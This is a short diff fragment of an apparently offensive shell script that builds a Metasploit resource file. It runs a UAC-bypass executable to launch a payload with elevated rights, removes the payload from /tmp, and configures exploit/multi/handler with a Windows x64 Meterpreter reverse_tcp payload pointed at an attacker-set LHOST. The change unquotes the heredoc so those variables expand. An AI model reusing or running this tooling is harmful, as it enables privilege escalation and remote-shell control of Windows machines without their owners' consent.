@@ -25,7 +25,7 @@ execute -f C:\\Windows\\Temp\\uacbypass.exe -a "%TEMP%\\$PAYLOAD_NAME" -H -i
 rm /tmp/$PAYLOAD_NAME
 BYPASS_EOF
 
-cat > "$OUTFILE" << 'RC'
+cat > "$OUTFILE" << RC
 use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
 set LHOST $LHOST
